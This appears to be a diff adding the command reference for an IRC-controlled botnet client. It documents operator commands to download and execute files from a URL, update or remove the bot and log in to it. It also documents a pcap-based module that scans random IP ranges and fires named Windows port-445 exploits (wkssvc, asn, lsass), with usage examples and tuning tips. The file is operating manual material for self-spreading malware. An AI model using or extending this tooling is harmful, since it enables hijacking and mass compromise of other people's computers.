@@ -1,0 +1,91 @@
+ _______            ________  
+/         |      | |          |       |
+|         |      | |          |       |
+ \ ____   |      | |          |       |
+       \  |------| |------    |       |
+	    | |      | |          |       |
+ ______/  |      | |________  |______ |______
+
+				 C O M M A N D S
+
+[ ] = optional
+< > = compulsory
+
+MAIN - 
+
+	.main.uptime		; shows uptime
+	.main.nsinfo		; shows net/system info
+	.main.reconnect		; reconnect bot from IRC
+	.main.disconnect	; disconnect bot from IRC
+	.main.remove		; remove bot
+
+	; download and execute
+	.main.download <url> <local> <-d> [-s]
+				OR
+	; download and update
+	.main.download <url> <local> <-u> [-s]
+
+AUTH - 
+	
+	.auth <pass>		; login to bot
+
+SCAN - 
+
+	<not implemented as of yet>
+
+PCAP - 
+
+	.pcap.listall		; list all network adapters
+	.pcap.install		; install requires components
+	.pcap.init			; initialize pcap for scan
+	.pcap.subnet		; obtain destination mac
+	
+	.pcap.stop			; stop scanning
+	.pcap.send <range> <exploit> <delay> <method> [method2] [-s]
+	
+	range
+	--------
+	any range in the form like this: 65.x.x.x, 65.23.x.x, etc.
+	
+	exploit
+	--------
+	wkssvc_445
+	asn_445
+	lsass_445
+
+	delay
+	--------
+	any number, ideally 100-200
+
+	method
+	--------
+	-e = exploit
+	-p = port scan (not fully working)
+	
+	method 2
+	---------
+	-a = sequential scan (not working fully yet)
+
+	eg.
+	.pcap.send 148.x.x.x wkssvc_445 120 -e -s
+
+	** IMPORTANT
+
+	The pcap scan uses 1 scan thread and only 
+	REQUIRES 1 scan thread to be efficient. Do not 
+	use a delay of less than 100 (ms) or the bot is prone
+	to lagout. An ideal would be around 100-200.
+	
+	Only random scanning is fully functional at the moment, 
+	so do not provide any other options like -r or -b.  
+
+	Do not re-install or re-initialize pcap as they
+	are already done at startup of bot. 
+
+	If PCAP does not work on the machine, the bot wil auto-switch
+	to normal TCP connect scanning, so do not perform any other options
+	regarding normal scan.
+
+	Do not alter code in any way without prior coding knowldege
+
+
